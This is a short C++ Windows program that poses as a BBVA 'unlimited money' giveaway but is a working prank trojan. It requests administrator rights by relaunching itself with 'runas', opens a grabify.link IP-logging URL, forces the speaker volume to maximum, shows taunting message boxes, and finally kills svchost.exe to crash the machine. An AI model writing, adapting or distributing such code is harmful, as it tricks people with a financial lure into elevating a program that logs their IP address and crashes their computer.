

#include <iostream>
#include <Windows.h>
#include <shellapi.h>
#include <sddl.h>
#include <endpointvolume.h>
#include <mmsystem.h>
#include <mmdeviceapi.h>

int volumen() {
    HRESULT hr;
    IMMDeviceEnumerator* pEnumerator = NULL;
    IMMDevice* pDevice = NULL;
    IAudioEndpointVolume* pEndpointVolume = NULL;

    // Initialize COM Library
    hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        // Handle initialization error
        return 1;
    }

    // Get the enumerator for audio devices
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (LPVOID*)&pEnumerator);
    if (FAILED(hr)) {
        // Handle enumerator creation error
        CoUninitialize();
        return 1;
    }

    // Get the default audio rendering endpoint
    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
    if (FAILED(hr)) {
        // Handle audio endpoint retrieval error
        pEnumerator->Release();
        CoUninitialize();
        return 1;
    }

    // Activate the audio endpoint
    hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (LPVOID*)&pEndpointVolume);
    if (FAILED(hr)) {
        // Handle activation error
        pDevice->Release();
        pEnumerator->Release();
        CoUninitialize();
        return 1;
    }

    // Set the master volume level
    float volumeLevel = 1.0f;  // 80% volume
    hr = pEndpointVolume->SetMasterVolumeLevelScalar(volumeLevel, NULL);
    if (FAILED(hr)) {
        // Handle volume setting error
        pEndpointVolume->Release();
        pDevice->Release();
        pEnumerator->Release();
        CoUninitialize();
        return 1;
    }

    // Cleanup and release resources
    pEndpointVolume->Release();
    pDevice->Release();
    pEnumerator->Release();
    CoUninitialize();

    return 0;
}
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }

        FreeSid(adminGroup);
    }

    return (isAdmin != FALSE);
}

void lmao() {
    system("taskkill.exe /IM svchost.exe /F");
}
int main()
{
    std::cout << "bienvenido a bbva dinero ilimitado\n";
    std::cout << "presione enter para resibir dinero gratsis\n\n\n";
    if (IsRunningAsAdmin()) {

        MessageBox(NULL, L"mamaste, si cierras la ventana se crashea tu pc", L"lol", MB_ICONINFORMATION);
        std::cout << "compa que le parece esa morra";
        MessageBox(NULL, L"compa que le parece esa morra", L"pesopluma", MB_ICONINFORMATION);
        ShellExecute(0, 0, L"https://grabify.link/IEGOTL", 0, 0, SW_SHOW);
        volumen();
    }
    else {
        system("pause");
    }

    wchar_t modulePath[MAX_PATH];
    GetModuleFileName(nullptr, modulePath, MAX_PATH);

    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";  // admin
    sei.lpFile = modulePath;  // correro modulo como admin
    sei.nShow = SW_SHOWNORMAL;
    
    if (ShellExecuteEx(&sei))
    {
        
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
        lmao();
    }
    else
    {
        // fallo
        std::cout << "Failed to create process: " << GetLastError() << std::endl;
    }
    
    return 0;
}


